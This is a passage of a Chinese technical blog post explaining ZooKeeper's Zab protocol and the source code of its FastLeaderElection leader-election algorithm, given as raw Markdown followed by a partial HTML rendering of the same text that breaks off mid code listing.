工作原理\nZookeeper服务有两种不同的运行模式。一种是“独立模式”，即只有一个Zookeeper服务器。这种模式较为简单，比较适合测试环境，但不能保证高可用性和恢复性。在实际应用中，Zookeeper通常以“复制模式”运行在一个计算机集群上。Zookeeper通过复制来实现高可用性，只要集群中半数以上的机器处于可用状态，它就能提供服务。也就是说，在一个有2n+1节点的集群中，任意n台机器出现故障，都可以保证服务继续，因为剩下的n+1台超过了半数。出于这个原因，一个集群通常包含奇数台机器。\n\n从概念上说，Zookeeper非常简单：它所做的就是确保对znode树的每一个修改都会被复制到集群中超过半数的机器上。如果少于半数的机器出现故障，则最少有一台机器会保存最新状态。其余的副本最终也会更新到这个状态。为了实现这个想法，Zookeeper使用了Azb协议。Zab协议包含两个可以无限重复的阶段：\n\n`阶段一`: 当服务启动或者Leader崩溃后，Zab就进入了阶段1。当Leader被选举出来，且超过半数(或指定数量)的Learner完成了和Leader的状态同步以后，阶段1就结束了。状态同步保持了Leader和其他服务器具有相同的系统状态。\n`阶段二`: 原子广播\n所有的写请求都被转发给Leader，再有Leader将更新广播给Learner。当半数以上的Follower已经将修改持久化以后，Leader才会提交这个更新，然后客户端才会收到一个更新成功的响应。这个用来达成共识的协议被设计成具有原子性，因此每个修改要么成功，要么失败。\n\n## Zookeeper Leader选举源码\nZookeeper 中QuorumPeer类出于源码“中心”位置，它与多个类关联，负责管理quorum协议。QuorumPeer继承自Thread，是集群环境下Zookeeper服务器的主线程类。它有4种状态： LOOKING、FOLLOWING、LEADING和OBSERVING，由成员state标识:\n``` java\n// src/java/main/org/apache/zookeeper/server/quorum/QuorumPeer.java\npublic enum ServerState {\n        LOOKING, FOLLOWING, LEADING, OBSERVING;\n    }\n```\n\n这4中状态决定了QuorumPeer的行为，即在集群中充当什么角色。state的初始状态是LOOKING，意思是寻找Leader服务器。一旦选举出Leader，QuorumPeer就切换自身状态，修改state的值，同时实例化对应的服务器控制类。服务器控制类有3种，Leader、Follower和Observer，它们作为QuorumPeer成员对象存在。\n\n> 前面废话了这么多现在正式进入正题。。。。。。\n\nQuorumPeer类有一个属性成员electionAlg，它是Election接口类型。服务器启动时，根据配置信息决定Election的具有实现类，指定选举算法。Election共有两个抽象方法\n``` java\npublic interface Election {\n    public Vote lookForLeader() throws InterruptedException;\n    public void shutdown();\n}\n```\n其中lookForLeader()是核心方法，返回一个Vote类型对象，标识被推荐服务器。Election的实现类有`LeaderEletcion`、`FastLeaderElection`、`AuthFastLeaderElection`。它们之间的区别在于通信机制以及lookForLeader的算法实现。由于源码中已经表示`LeaderElection`和`AuthFastLeaderElection`已经在3.4.0版本被弃用，因此在这里主要看`FastLeaderElection`。\n\n`FastLeaderElection`有3个内部线程类: Listener、SendWorker、RecvWorker。Listener线程新建ServerSocketChannel，监听选举端口，一旦接收到连接请求，调用receiveConnection方法，启动发送线程SendWorker和接收线程RecvWorker。\n\n`LookForLeader`详细源码\n``` java\nsynchronized(this){\n    logicalclock++;\n    updateProposal(getInitId(), getInitLastLoggedZxid(), getPeerEpoch());\n}\n\nsendNotifications();\n```\n原子性操作，Leader选举开始每个节点投自己一票，其中`getInitId()`、`getInitLastLoggedZxid()`、`getPeerEpoch()`表示当前self节点的状态，然后将投票结果send给其他节点。接下来就循环交换投票信息，直到找到Leader节点。\n``` java\nwhile ((self.getPeerState() == ServerState.LOOKING) && (!stop)) {\n    /*\n     * 从投票消息队列中接收一条消息\n     */\n    Notification n = recvqueue.poll(notTimeout,\n              TimeUnit.MILLISECONDS);\n    if (n == null) {...}\n    /*\n     * 检查n节点是不是参与投票的节点，只有PeerType=PARTICIPANT的节点消息才会参与投票\n     * Observers are not contained in this view, only nodes with\n     * PeerType=PARTICIPANT.\n     */\n    else if(self.getVotingView().containsKey(n.sid)) {\n        switch (n.state) {\n            case LOOKING: 跟自己的投票比较。\n            case OBSERVING: 没有操作\n            case FOLLOWING:\n            case LEADING: 当已经收到LEADING和FOLLOWING表示已经票选出Leader，然后投最后一票给Leader，结束投票\n            default: 没有操作\n    }\n}\n```\n分别看`LOOKING`和`FOLLOWING`、`LEADING`干了什么\n`LOOKING`在干的事情\n``` java\n/*\n * 表示投票轮次大于本节点记录的轮次，表示自己已经落后投票了，将自己的\n * 投票轮次设置为最新的，清空自己的票箱，这个票箱记录了集群中其他节点\n * 的投票结果\n */\nif (n.electionEpoch > logicalclock) {\n    logicalclock = n.electionEpoch;\n    recvset.clear();\n    /*\n     * 将n节点的投票结果与自己的投票结果比较,如果投票比自己的投票合理，\n     * 更新自己的投票，否则还是投自己\n     */\n    if(totalOrderPredicate(n.leader, n.zxid, n.peerEpoch,\n    　　　　getInitId(), getInitLastLoggedZxid(), getPeerEpoch())) {\n        updateProposal(n.leader, n.zxid, n.peerEpoch);\n    } else {\n    \tupdateProposal(getInitId(),\n        \tgetInitLastLoggedZxid(),\n        \tgetPeerEpoch());\n    }\n    // 发送自己的投票结果\n    sendNotifications();\n} else if (n.electionEpoch < logicalclock) {\n    // 投票轮次比自己记录的轮次小，说明这个投票已经过时，不处理\n    break;\n} else if (totalOrderPredicate(n.leader, n.zxid, n.peerEpoch,\n          proposedLeader, proposedZxid, proposedEpoch)) {\n    // 如果是一个轮次，将n节点的投票与自己比较，如果投票更合理，更新投票\n    updateProposal(n.leader, n.zxid, n.peerEpoch);\n    sendNotifications();\n}\n// 将n节点的投票记录下来\nrecvset.put(n.sid, new Vote(n.leader, n.zxid, n.electionEpoch, n.peerEpoch));\n\n/*\n * 在自己的票箱中查看自己投票的节点是否已经被集群中一半以上的\n * 节点认可了，如果已经有一半以上的节点认可，则结束选举\n */\nif (termPredicate(recvset,\n         new Vote(proposedLeader, proposedZxid,\n         logicalclock, proposedEpoch))) {\n\n    // Verify if there is any change in the proposed leader\n    // 这里没太理解，\n    while((n = recvqueue.poll(finalizeWait,\n            TimeUnit.MILLISECONDS)) != null){\n        if(totalOrderPredicate(n.leader, n.zxid, n.peerEpoch,\n                 proposedLeader, proposedZxid, proposedEpoch)){\n            recvqueue.put(n);\n            break;\n        }\n    }\n\n    /*\n     * This predicate is true once we don't read any new\n     * relevant message from the reception queue\n     */\n    if (n == null) {\n        self.setPeerState((proposedLeader == self.getId()) ?\n            ServerState.LEADING: learningState());\n\n        Vote endVote = new Vote(proposedLeader,\n            proposedZxid,\n            logicalclock,\n            proposedEpoch);\n        leaveInstance(endVote);\n        return endVote;\n    }\n}\n```\n其中没有说清楚接收的投票如何和自己的投票比较的，也就是`totalOrderPredicate`方法的实现\n``` java\nprotected boolean totalOrderPredicate(long newId, long newZxid, long newEpoch, long curId, long curZxid, long curEpoch) {\n    if(self.getQuorumVerifier().getWeight(newId) == 0){\n        return false;\n    }\n\n    /*\n     * We return true if one of the following three cases hold:\n     * 1- New epoch is higher\n     * 2- New epoch is the same as current epoch, but new zxid is higher\n     * 3- New epoch is the same as current epoch, new zxid is the same\n     *  as current zxid, but server id is higher.\n     */\n\n    return ((newEpoch > curEpoch) ||\n            ((newEpoch == curEpoch) &&\n            ((newZxid > curZxid) || ((newZxid == curZxid) && (newId > curId)))));\n}\n```\n可以看出，比较的顺序是Epoch、zxid、Id，优先选投票轮次高的，投票轮次相同选Zxid高的，Zxid相同选id高的，因此在Zookeeper启动的时候，往往id高的获得Leader，但不绝对，比如在5个节点的集群中，启动顺序分别是1->2->3->4->5，当票选到节点3时已经票选超过半数，那么后面启动的4和5就直接成为follower\n\n接下来再分析`FOLLOWING`和`LEADING`\n``` java\nif(n.electionEpoch == logicalclock){\n    recvset.put(n.sid, new Vote(n.leader, n.zxid, n.electionEpoch, n.peerEpoch));\n    // 如果推举的Leader是自己，把自己的状态改为LEADING\n    if(ooePredicate(recvset, outofelection, n)) {\n        self.setPeerState((n.leader == self.getId()) ?\n        ServerState.LEADING: learningState());\n    Vote endVote = new Vote(n.leader, n.zxid, n.electionEpoch, n.peerEpoch);\n    leaveInstance(endVote);\n    return endVote;\n}\n/*\n * 确定Leader之前要保证半数以上的节点已经成为follower\n * Before joining an established ensemble, verify\n * a majority is following the same leader.\n */\noutofelection.put(n.sid, new Vote(n.version,\n        n.leader,\n        n.zxid,\n        n.electionEpoch,\n        n.peerEpoch,\n        n.state));\n\nif(ooePredicate(outofelection, outofelection, n)) {\n        synchronized(this){\n            logicalclock = n.electionEpoch;\n            self.setPeerState((n.leader == self.getId()) ?\n                ServerState.LEADING: learningState());\n            }\n        Vote endVote = new Vote(n.leader, n.zxid, n.electionEpoch, n.peerEpoch);\n        leaveInstance(endVote);\n        return endVote;\n}\n```\n\n这里需要解释一下`ooePredicate`\n``` java\n/**\n * This predicate checks that a leader has been elected. It doesn't\n * make a lot of sense without context (check lookForLeader) and it\n * has been separated for testing purposes.\n * 有两个map，一个表示收到的投票集合，一个表示LEADING状态节点和FOLLOWING节点的投票\n * 集合，这里要确定两个条件：一个是在收到的LOOKING节点中半数认为n节点应该是Leader\n * 另一个是LEADING节点必须告诉其他节点自己是LEADING状态，避免一直投票\n *\n * @param recv  map of received votes\n * @param ooe   map containing out of election votes (LEADING or FOLLOWING)\n * @param n     Notification\n * @return\n */\nprotected boolean ooePredicate(HashMap<Long,Vote> recv,\n                                HashMap<Long,Vote> ooe,\n                                Notification n) {\n\n    return (termPredicate(recv, new Vote(n.version,\n                                         n.leader,\n                                         n.zxid,\n                                         n.electionEpoch,\n                                         n.peerEpoch,\n                                         n.state))\n            && checkLeader(ooe, n.leader, n.electionEpoch));\n\n}\n```\n再来看一下`checkLeader`\n``` java\n\t/**\n     * In the case there is a leader elected, and a quorum supporting\n     * this leader, we have to check if the leader has voted and acked\n     * that it is leading. We need this check to avoid that peers keep\n     * electing over and over a peer that has crashed and it is no\n     * longer leading.\n     *\n     * @param votes set of votes\n     * @param   leader  leader id\n     * @param   electionEpoch   epoch id\n     */\n    protected boolean checkLeader(\n            HashMap<Long, Vote> votes,\n            long leader,\n            long electionEpoch){\n\n        boolean predicate = true;\n\n        /*\n         * If everyone else thinks I'm the leader, I must be the leader.\n         * The other two checks are just for the case in which I'm not the\n         * leader. If I'm not the leader and I haven't received a message\n         * from leader stating that it is leading, then predicate is false.\n         */\n\n        if(leader != self.getId()){\n            if(votes.get(leader) == null) predicate = false;\n            else if(votes.get(leader).getState() != ServerState.LEADING) predicate = false;\n        } else if(logicalclock != electionEpoch) {\n            predicate = false;\n        }\n\n        return predicate;\n    }\n```\n\n`FastLeaderElection`源码分析完了，总结一下：首先，每个节点先给自己投票，然后将投票信息发送给集群中的其他节点；每个节点收到其他节点的投票，放在**投票队列**中，从队列中提取投票，跟自己的投票比较，如果投票更合理，就替换自己的投票，否则不改变自己的投票。然后检测自己当前的投票是否相同于集群半数以上的节点，如果相同于半数以上投票，则判断这个投票是不是投的自己，如果是投的自己，则改变自己的状态为LEADING，否则改为FOLLOWING或者OBSERVER，最后返回最后的投票，并结束`LookForLeader`。","slug":"ZookeeperLeaderElection","published":1,"updated":"2018-04-19T12:49:54.212Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscy00014yp0ltl4n16zs","content":"<h2 id=\"Zookeeper简介\"><a href=\"#Zookeeper简介\" class=\"headerlink\" title=\"Zookeeper简介\"></a>Zookeeper简介</h2><p>Zookeeper 是Apache Hadoop开源项目中的子项目，提供了一个分布式的协调服务框架。Zookeeper暴露了一组简单的操作原语(Primitive)集合，分布式应用能够基于这些原语实现更加高层的服务，包括同步机制、配置管理、服务器集群管理和统一命名服务等。</p>\n<p>作为一个分布式的服务框架，Zookeeper主要解决分布式集群中应用系统的一致性问题，它采用类似文件系统目录的节点树的结构作为数据存储模型，并对已存储数据的状态变化进行维护和监控，通过监控这些数据状态的变化实现基于数据的集群管理。</p>\n<p>Zookeeper 采用服务器集群的方式提供基本服务，服务器集群成为组，组中的成员具有两种角色，即一个唯一的领导者和若干个成员服务器，组能够为多个客户端提供服务。</p>\n<a id=\"more\"></a>\n<h2 id=\"Zookeeper角色\"><a href=\"#Zookeeper角色\" class=\"headerlink\" title=\"Zookeeper角色\"></a>Zookeeper角色</h2><p>Zookeeper中的角色主要有以下几种</p>\n<table>\n<thead>\n<tr>\n<th>角色</th>\n<th>角色说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>领导者(Leader)</td>\n<td>Leader不接受客户端的请求，负责进行投票的发起和决议，最终更新状态</td>\n</tr>\n<tr>\n<td>学习者(Learner)-跟随着(Follower)</td>\n<td>Follower用于接收客户请求并向客户端返回结果，在选举过程中参与投票</td>\n</tr>\n<tr>\n<td>学习者(Learner)-观察者(Obserber)</td>\n<td>Observer可以接收客户端连接，将写请求转发给Leader节点。但它不参与投票过程，只同步Leader的状态。Observer的目的是为了扩展系统，提高读取速度</td>\n</tr>\n<tr>\n<td>客户端(Client)</td>\n<td>请求发起方</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"Zookeeper-工作原理\"><a href=\"#Zookeeper-工作原理\" class=\"headerlink\" title=\"Zookeeper 工作原理\"></a>Zookeeper 工作原理</h2><p>Zookeeper服务有两种不同的运行模式。一种是“独立模式”，即只有一个Zookeeper服务器。这种模式较为简单，比较适合测试环境，但不能保证高可用性和恢复性。在实际应用中，Zookeeper通常以“复制模式”运行在一个计算机集群上。Zookeeper通过复制来实现高可用性，只要集群中半数以上的机器处于可用状态，它就能提供服务。也就是说，在一个有2n+1节点的集群中，任意n台机器出现故障，都可以保证服务继续，因为剩下的n+1台超过了半数。出于这个原因，一个集群通常包含奇数台机器。</p>\n<p>从概念上说，Zookeeper非常简单：它所做的就是确保对znode树的每一个修改都会被复制到集群中超过半数的机器上。如果少于半数的机器出现故障，则最少有一台机器会保存最新状态。其余的副本最终也会更新到这个状态。为了实现这个想法，Zookeeper使用了Azb协议。Zab协议包含两个可以无限重复的阶段：</p>\n<p><code>阶段一</code>: 当服务启动或者Leader崩溃后，Zab就进入了阶段1。当Leader被选举出来，且超过半数(或指定数量)的Learner完成了和Leader的状态同步以后，阶段1就结束了。状态同步保持了Leader和其他服务器具有相同的系统状态。<br><code>阶段二</code>: 原子广播<br>所有的写请求都被转发给Leader，再有Leader将更新广播给Learner。当半数以上的Follower已经将修改持久化以后，Leader才会提交这个更新，然后客户端才会收到一个更新成功的响应。这个用来达成共识的协议被设计成具有原子性，因此每个修改要么成功，要么失败。</p>\n<h2 id=\"Zookeeper-Leader选举源码\"><a href=\"#Zookeeper-Leader选举源码\" class=\"headerlink\" title=\"Zookeeper Leader选举源码\"></a>Zookeeper Leader选举源码</h2><p>Zookeeper 中QuorumPeer类出于源码“中心”位置，它与多个类关联，负责管理quorum协议。QuorumPeer继承自Thread，是集群环境下Zookeeper服务器的主线程类。它有4种状态： LOOKING、FOLLOWING、LEADING和OBSERVING，由成员state标识:<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/java/main/org/apache/zookeeper/server/quorum/QuorumPeer.java</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">enum</span> ServerState &#123;</span><br><span class=\"line\">        LOOKING, FOLLOWING, LEADING, OBSERVING;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<p>这4中状态决定了QuorumPeer的行为，即在集群中充当什么角色。state的初始状态是LOOKING，意思是寻找Leader服务器。一旦选举出Leader，QuorumPeer就切换自身状态，修改state的值，同时实例化对应的服务器控制类。服务器控制类有3种，Leader、Follower和Observer，它们作为QuorumPeer成员对象存在。</p>\n<blockquote>\n<p>前面废话了这么多现在正式进入正题。。。。。。</p>\n</blockquote>\n<p>QuorumPeer类有一个属性成员electionAlg，它是Election接口类型。服务器启动时，根据配置信息决定Election的具有实现类，指定选举算法。Election共有两个抽象方法<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">Election</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Vote <span class=\"title\">lookForLeader</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> InterruptedException</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">shutdown</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>其中lookForLeader()是核心方法，返回一个Vote类型对象，标识被推荐服务器。Election的实现类有<code>LeaderEletcion</code>、<code>FastLeaderElection</code>、<code>AuthFastLeaderElection</code>。它们之间的区别在于通信机制以及lookForLeader的算法实现。由于源码中已经表示<code>LeaderElection</code>和<code>AuthFastLeaderElection</code>已经在3.4.0版本被弃用，因此在这里主要看<code>FastLeaderElection</code>。</p>\n<p><code>FastLeaderElection</code>有3个内部线程类: Listener、SendWorker、RecvWorker。Listener线程新建ServerSocketChannel，监听选举端口，一旦接收到连接请求，调用receiveConnection方法，启动发送线程SendWorker和接收线程RecvWorker。</p>\n<p><code>LookForLeader</code>详细源码<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">synchronized</span>(<span class=\"keyword\">this</span>)&#123;</span><br><span class=\"line\">    logicalclock++;</span><br><span class=\"line\">    updateProposal(getInitId(), getInitLastLoggedZxid(), getPeerEpoch());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">sendNotifications();</span><br></pre></td></tr></table></figure></p>\n<p>原子性操作，Leader选举开始每个节点投自己一票，其中<code>getInitId()</code>、<code>getInitLastLoggedZxid()</code>、<code>getPeerEpoch()</code>表示当前self节点的状态，然后将投票结果send给其他节点。接下来就循环交换投票信息，直到找到Leader节点。<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> ((self.getPeerState() == ServerState.LOOKING) &amp;&amp; (!stop)) &#123;</span><br><span class=\"line\">    <span class=\"comment\">/*</span><br><span class=\"line\">     * 从投票消息队列中接收一条消息</span><br><span class=\"line\">     */</span></span><br><span class=\"line\">    Notification n = recvqueue.poll(notTimeout,</span><br><span class=\"line\">              TimeUnit.MILLISECONDS);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (n == <span class=\"keyword\">null</span>) &#123;...&#125;</span><br><span class=\"line\">    <span class=\"comment\">/*</span><br><span class=\"line\">     * 检查n节点是不是参与投票的节点，只有PeerType=PARTICIPANT的节点消息才会参与投票</span><br><span class=\"line\">     * Observers are not contained in this view, only nodes with</span><br><span class=\"line\">     * PeerType=PARTICIPANT.</span><br><span class=\"line\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(self.getVotingView().containsKey(n.sid)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">switch</span> (n.state) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> LOOKING: 跟自己的投票比较。</span><br><span class=\"line\">            <span class=\"keyword\">case</span> OBSERVING: 没有操作</span><br><span class=\"line\">            <span class=\"keyword\">case</span> FOLLOWING:</span><br><span class=\"line\">            <span class=\"keyword\">case</span> LEADING: 当已经收到LEADING和FOLLOWING表示已经票选出Leader，然后投最后一票给Leader，结束投票</span><br><span class=\"line\">            <span class=\"keyword\">default</span>: 没有操作</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>分别看<code>LOOKING</code>和<code>FOLLOWING</code>、<code>LEADING</code>干了什么<br><code>LOOKING</code>在干的事情<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span><br><span class=\"line\"> * 表示投票轮次大于本节点记录的轮次，表示自己已经落后投票了，将自己的</span><br><span class=\"line\"> * 投票轮次设置为最新的，清空自己的票箱，这个票箱记录了集群中其他节点</span><br><span class=\"line\"> * 的投票结果</span><br><span class=\"line\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (n.electionEpoch &gt; logicalclock) &#123;</span><br><span class=\"line\">    logicalclock = n.electionEpoch;</span><br><span class=\"line\">    recvset.clear();</span><br><span class=\"line\">    <span class=\"comment\">/*</span><br><span class=\"line\">     * 将n节点的投票结果与自己的投票结果比较,如果投票比自己的投票合理，</span><br><span class=\"line\">     * 更新自己的投票，否则还是投自己</span><br><span class=\"line\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(totalOrderPredicate(n.leader, n.zxid, n.peerEpoch,</span><br><span class=\"line\">    　　　　getInitId(), getInitLastLoggedZxid(), getPeerEpoch())) &#123;</span><br><span class=\"line\">        updateProposal(n.leader, n.zxid, n.peerEpoch);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    \tupdateProposal(getInitId(),</span><br><span class=\"line\">        \tgetInitLastLoggedZxid(),</span><br><span class=\"line\">        \tgetPeerEpoch());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 发送自己的投票结果</span></span><br><span class=\"line\">    sendNotifications();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (n.electionEpoch &lt; logicalclock) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 投票轮次比自己记录的轮次小，说明这个投票已经过时，不处理</span></span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (totalOrderPredicate(n.leader, n.zxid, n.peerEpoch,</span><br><span class=\"line\">          proposedLeader, proposedZxid, proposedEpoch)) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 如果是一个轮次，将n节点的投票与自己比较，如果投票更合理，更新投票</span></span><br><span class=\"line\">    updateProposal(n.leader, n.zxid, n.peerEpoch);</span><br><span class=\"line\">    sendNotifications();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 将n节点的投票记录下来</span></span><br><span class=\"line\">recvset.put(n.sid, <span class=\"keyword\">new</span> Vote(n.leader, n.zxid, n.electionEpoch, n.peerEpoch));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span><br><span class=\"line\"> * 在自己的票箱中查看自己投票的节点是否已经被集群中一半以上的</span><br><span class=\"line\"> * 节点认可了，如果已经有一半以上的节点认可，则结束选举</span><br><span class=\"line\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (termPredicate(recvset,</span><br><span class=\"line\">         <span class=\"keyword\">new</span> Vote(proposedLeader, proposedZxid,</span><br><span class=\"line\">         logicalclock, proposedEpoch))) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Verify if there is any change in the proposed leader</span></span><br><span class=\"line\">    <span class=\"comment\">// 这里没太理解，</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>((n = recvqueue.poll(finalizeWait,</span><br><span class=\"line\">            TimeUnit.MILLISECONDS)) != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(totalOrderPredicate(n.leader, n.zxid, n.peerEpoch,</span><br><span class=\"line\">                 proposedLeader, proposedZxid, proposedEpoch))&#123;</span><br><span class=\"line\">            recvqueue.put(n);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*</span><br><span class=\"line\">     * This predicate is true once we don't read any new</span><br><span class=\"line\">     * relevant message from the reception queue</span><br><span class=\"line\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (n == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        self.setPeerState((proposedLeader == self.getId()) ?</span><br><span class=\"line\">            ServerState.LEADING: learningState());</span><br><span class=\"line\"></span><br><span class=\"line\">        Vote endVote = <span class=\"keyword\">new</span> Vote(proposedLeader,</span><br><span class=\"line\">            proposedZxid,</span><br><span class=\"line\">            logicalclock,</span><br><span class=\"line\">            proposedEpoch);</span><br><span class=\"line\">        leaveInstance(endVote);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> endVote;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>其中没有说清楚接收的投票如何和自己的投票比较的，也就是<code>totalOrderPredicate</code>方法的实现<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">boolean</span> <span class=\"title\">totalOrderPredicate</span><span class=\"params\">(<span class=\"keyword\">long</span> newId, <span class=\"keyword\">long</span> newZxid, <span class=\"keyword\">long</span> newEpoch, <span class=\"keyword\">long</span> curId, <span class=\"keyword\">long</span> curZxid, <span class=\"keyword\">long</span> curEpoch)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(self.getQuorumVerifier().getWeight(newId) == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*</span><br><span class=\"line\">     * We return true if one of the following three cases hold:</span><br><span class=\"line\">     * 1- New epoch is higher</span><br><span class=\"line\">     * 2- New epoch is the same as current epoch, but new zxid is higher</span><br><span class=\"line\">     * 3- New epoch is the same as current epoch, new zxid is the same</span><br><span class=\"line\">     *  as current zxid, but server id is higher.</span><br><span class=\"line\">     */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> ((newEpoch &gt; curEpoch) ||</span><br><span class=\"line\">            ((newEpoch == curEpoch) &amp;&amp;</span><br><span class=\"line\">            ((newZxid &gt; curZxid) || ((newZxid == curZxid) &amp;&amp; (newId &gt; curId)))));</span><br><span 